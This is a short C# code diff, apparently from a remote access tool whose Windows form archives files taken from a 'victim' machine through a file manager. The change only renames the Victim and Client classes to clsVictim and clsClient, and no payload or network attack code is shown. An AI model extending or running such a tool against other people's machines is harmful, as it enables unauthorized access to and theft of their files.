@@ -12,11 +12,11 @@ namespace Eden
 {
     public partial class frmFileArchive : Form
     {
-        private Victim m_victim { get; set; }
+        private clsVictim m_victim { get; set; }
         private List<frmFileMgr.stEntryTag> m_lstEntry { get; set; }
         private bool m_bCompress { get; set; }
 
-        public frmFileArchive(Victim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
+        public frmFileArchive(clsVictim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
         {
             InitializeComponent();
 
@@ -33,7 +33,7 @@ namespace Eden
 
         private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;
 
-        private void fnRecv(Client clnt, string szVictimID, string[] asMsg)
+        private void fnRecv(clsClient clnt, string szVictimID, string[] asMsg)
         {
             try
             {
